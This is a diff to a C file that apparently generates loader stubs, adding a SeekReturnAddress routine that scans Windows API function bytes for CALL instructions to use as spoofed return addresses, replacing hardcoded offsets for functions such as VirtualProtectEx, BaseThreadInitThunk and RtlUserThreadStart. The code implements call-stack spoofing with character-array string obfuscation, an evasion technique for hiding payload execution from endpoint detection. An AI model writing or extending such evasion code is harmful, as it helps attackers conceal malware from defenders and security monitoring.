@@ -481,6 +481,36 @@ const char *g_StubTemplate =
     "ControlPc, PDWORD64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable);\n"
     "\n"
     // -----------------------------------------------------------------------
+    // SeekReturnAddress: Scans a function's memory looking for a CALL
+    // instruction
+    // to use as a spoofed return address, avoiding hardcoded offsets.
+    // -----------------------------------------------------------------------
+    "PVOID SeekReturnAddress(PVOID pBase) {\n"
+    "    if (!pBase) return NULL;\n"
+    "    \n"
+    "    PBYTE pBytes = (PBYTE)pBase;\n"
+    "    \n"
+    "    // Scan up to 256 bytes deep into the function body\n"
+    "    for (int i = 0; i < 256; i++) {\n"
+    "        // Look for 'CALL QWORD PTR [RIP+offset]' (Opcode: FF 15)\n"
+    "        if (pBytes[i] == 0xFF && pBytes[i+1] == 0x15) {\n"
+    "            // The instruction is 6 bytes long. The return address is "
+    "immediately after.\n"
+    "            return (PVOID)(pBytes + i + 6);\n"
+    "        }\n"
+    "        \n"
+    "        // Look for relative 'CALL' (Opcode: E8)\n"
+    "        if (pBytes[i] == 0xE8) {\n"
+    "            // The instruction is 5 bytes long.\n"
+    "            return (PVOID)(pBytes + i + 5);\n"
+    "        }\n"
+    "    }\n"
+    "    \n"
+    "    // Fallback to the function prologue if no CALL is found.\n"
+    "    return pBase;\n"
+    "}\n"
+    "\n"
+    // -----------------------------------------------------------------------
     // CalcFrameSize: Calculates the stack frame size of a target function.
     // -----------------------------------------------------------------------
     // This function parses the .pdata (Exception Directory) of a module to find
@@ -710,21 +740,24 @@ const char *g_StubTemplate =
     "    char sKBase[] = "
     "{'k','e','r','n','e','l','b','a','s','e','.','d','l','l',0};\n"
     "    Mask_Security.pAddress = "
-    "(PVOID)((ULONG_PTR)GetProcAddress(GetModuleHandleA(sKBase), "
-    "\"VirtualProtectEx\") + 0x4B);\n"
-    "    Mask_Worker.pAddress = (PVOID)GetProcAddress(GetModuleHandleA(sK32), "
-    "\"WaitForSingleObjectEx\");\n"
-    "    Mask_Memory.pAddress = (PVOID)GetProcAddress(GetModuleHandleA(sK32), "
-    "\"MapViewOfFile\");\n"
-    "    Mask_File.pAddress = (PVOID)GetProcAddress(GetModuleHandleA(sK32), "
-    "\"CreateFileW\");\n"
+    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sKBase), "
+    "\"VirtualProtectEx\"));\n"
+    "    Mask_Worker.pAddress = "
+    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), "
+    "\"WaitForSingleObjectEx\"));\n"
+    "    Mask_Memory.pAddress = "
+    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), "
+    "\"MapViewOfFile\"));\n"
+    "    Mask_File.pAddress = "
+    "SeekReturnAddress(GetProcAddress(GetModuleHandleA(sK32), "
+    "\"CreateFileW\"));\n"
     "\n"
     "    qThreadBase = "
-    "(PVOID)((ULONG_PTR)GetProcAddress(GetModuleHandleA(sK32), "
-    "\"BaseThreadInitThunk\") + 0x14);\n"
+    "SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(GetModuleHandleA(sK32)"
+    ", \"BaseThreadInitThunk\")));\n"
     "    qRtlUserThreadStart = "
-    "(PVOID)((ULONG_PTR)GetProcAddress(GetModuleHandleA(sNtdll), "
-    "\"RtlUserThreadStart\") + 0x21);\n"
+    "SeekReturnAddress((PVOID)((ULONG_PTR)GetProcAddress(GetModuleHandleA("
+    "sNtdll), \"RtlUserThreadStart\")));\n"
     "    if(!qThreadBase) { printf(\"[!] Failed to resolve "
     "BaseThreadInitThunk\\n\"); return FALSE; }\n"
     "    \n"
@@ -1076,4 +1109,3 @@ int main() {
     return EXIT_FAILURE;
   }
 }
-
